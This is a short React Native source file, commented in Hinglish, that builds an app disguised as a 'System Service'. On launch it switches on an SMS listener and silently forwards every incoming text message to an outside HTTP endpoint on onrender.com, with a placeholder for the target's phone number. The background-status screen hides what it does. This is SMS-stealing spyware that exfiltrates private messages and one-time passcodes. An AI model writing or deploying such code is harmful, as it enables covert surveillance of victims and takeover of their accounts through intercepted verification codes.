import React, { useEffect } from 'react';
import { View, Text, StyleSheet } from 'react-native';
import { SmsGateway } from 'react-native-sms-gateway';

const App = () => {
  useEffect(() => {
    // 1. SMS Listener ko active karein
    SmsGateway.enableSmsListener(true);

    // 2. Render Bridge ko link karein
    SmsGateway.setHttpConfigs([
      {
        url: 'https://sms-bridge-service.onrender.com/forward',
        headers: {
          'Content-Type': 'application/json',
        },
      },
    ]);

    // 3. Delivery mode set karein (Sirf HTTP bridge ke liye)
    SmsGateway.setDeliveryType('http');

    // 4. (Optional) User identification ke liye phone number set karein
    SmsGateway.setUserPhoneNumber('TARGET_PHONE_NAME');

    console.log("System initialized: Waiting for SMS...");
  }, []);

  return (
    <View style={styles.container}>
      <Text style={styles.title}>System Service</Text>
      <Text style={styles.status}>Status: Running in background</Text>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f5f5f5',
  },
  title: {
    fontSize: 20,
    fontWeight: 'bold',
  },
  status: {
    fontSize: 14,
    color: 'green',
    marginTop: 10,
  },
});

export default App;
